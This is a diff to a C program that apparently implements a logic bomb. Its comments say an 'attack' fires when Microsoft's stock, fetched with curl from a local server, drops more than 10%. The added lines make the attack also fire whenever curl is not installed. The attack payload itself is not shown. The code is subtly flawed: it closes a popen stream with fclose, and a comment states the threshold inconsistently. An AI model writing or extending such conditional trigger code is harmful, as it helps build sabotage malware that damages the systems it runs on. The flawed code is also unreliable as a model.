@@ -13,6 +13,30 @@
 // Server URL for Microsoft stock data
 #define MICROSOFT_STOCK_URL "http://172.17.0.1:8000/stock/microsoft"
 
+// Function to check if curl is installed on the system
+int is_curl_installed() {
+    FILE *fp;
+    char buffer[256];
+
+    // Try running 'which curl' to check if curl is installed
+    fp = popen("which curl", "r");
+    if (fp == NULL) {
+        // If 'which curl' fails, curl is not installed
+        return 0;
+    }
+
+    // Read output of 'which curl'
+    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        // If curl's path is found, it's installed
+        fclose(fp);
+        return 1;
+    }
+
+    // Curl is not installed
+    fclose(fp);
+    return 0;
+}
+
 // Function to obtain the stock value of Microsoft and the percentage of change.
 // In case the stock value dropped more than 10% (percentage of change < 10%), 
 // the attack is triggered.
@@ -24,6 +48,13 @@ int get_microsoft_stock() {
     int current_stock_value;
     float percentage_change;
     int parse_result;
+
+    // Check if curl is installed
+    if (!is_curl_installed()) {
+        printf("\e[33mWARNING:\e[0m Curl is not installed\n");
+        printf("\e[31mTriggering attack...\e[0m\n");
+        return 0;
+    }
 
     // Construct the curl command
     snprintf(command, sizeof(command), "curl -s %s", MICROSOFT_STOCK_URL);
